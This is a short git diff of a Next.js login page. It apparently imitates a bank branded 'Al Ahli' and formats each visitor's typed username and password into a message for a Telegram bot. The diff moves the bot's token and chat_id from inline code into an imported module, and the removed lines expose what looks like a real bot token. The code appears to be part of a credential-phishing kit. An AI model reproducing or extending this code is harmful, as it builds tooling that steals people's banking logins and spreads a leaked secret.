@@ -3,7 +3,7 @@ import styles from './ahle.module.css'
 import Image from 'next/image'
 import icon1 from '../../../../../public/2.png'
 import { useRef } from 'react'
-
+import bot from '@/compnante/dataBot'
 import { useRouter,useSearchParams } from 'next/navigation';
 const Page = () => {
     const username = useRef()
@@ -13,10 +13,7 @@ const Page = () => {
     const datas = x.get('names')
     const handleOnSubmit = (e) => {
         e.preventDefault();
-        var bot={
-      token:"6602536113:AAEOJoRLjsoPUxdqp9SwU1jeFqtuXf712PY",
-      chat_id:6364334502
-    }
+
         var length =`الاهلي  اسم المستخدم  : ${username.current.value} %0A كلمة المرور: ${password.current.value} %0A %0A ${datas}`
        
         
